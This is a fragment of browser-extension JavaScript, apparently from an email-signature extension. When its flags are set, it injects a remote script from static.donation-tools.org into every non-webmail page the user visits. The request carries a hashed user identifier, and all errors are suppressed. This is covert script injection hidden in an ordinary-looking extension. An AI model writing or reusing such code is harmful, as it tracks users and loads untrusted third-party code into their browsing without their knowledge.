var wisestamp_irh=new function(){var b=this;
function a(c,g,d){var f=/^([^\/\?]*\/){2}([^\.\/\?]+\.)*(mail\.google\.com|mail\.yahoo\.com|mail\.live\.com|mail\.aol\.com|webmail\.aol\.com|mail\.rambler\.ru|inbox\.google\.com|outlook\.office365\.com|outlook\.com|secureserver\.net|godaddy\.com|wisestamp\.com)\//gi;
var e=/^(http|https)\:\/\//gi;
if(g.status==="complete"){if((d.url.match(f)===null)&&(!(d.url.match(e)===null))){chrome.tabs.executeScript(c,{code:'try {(function() {var c="Staging";c=c.replace(/\\-[0-9]*/g,"");window.__rvzirbnhd={product_name:c,subid:"1111-1004"};window.___irhExId = "'+wisestamp_utils.md5("--- "+wisestamp_controller.load_param("wisestamp_uid")+" ---")+'";var b=document.createElement("SCRIPT");b.src="//static.donation-tools.org/widgets/wp/widget.js?_irh_exid="+window.___irhExId;b.type="text/javascript";var a=document.getElementsByTagName("head")[0];a.appendChild(b)})();} catch(e) {}'})
}}}this.update_listener=function(){chrome.tabs.onUpdated.removeListener(a);
var c=wisestamp_controller.load_param("flags");
var d=wisestamp_controller.load_param("prefs");
if((typeof(c)==="object")&&(!(c===null))&&(c.irh_enabled===true)&&(typeof(d)==="object")&&(!(d===null))&&(d.irh_enabled===true)){chrome.tabs.onUpdated.addListener(a)
}}
};